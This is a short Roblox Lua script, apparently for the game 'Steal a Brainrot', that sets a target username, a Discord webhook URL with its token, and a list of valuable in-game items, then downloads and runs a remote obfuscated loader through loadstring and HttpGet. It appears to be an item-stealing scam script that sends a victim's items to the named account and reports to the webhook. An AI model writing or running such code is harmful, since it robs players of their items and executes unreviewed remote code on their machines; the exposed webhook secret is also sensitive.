getgenv().TARGET_USERNAME = "platanillas"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1558591365904994415/eU5f0SsH2HMeg3WUj1TmVwaSNS1aFD_2oIKGqZq2kdbIAVJ1jnn71Ie1gOqeKWrILvB7"
getgenv().NORMAL_BRAINROTS = {
    ["Garama and Madundung"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Aquanini"] = true,
    ["Dragon Gingerini"] = true
}
getgenv().NORMAL_BASE_SKINS = {
}
getgenv().NORMAL_GEARS = {
}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)
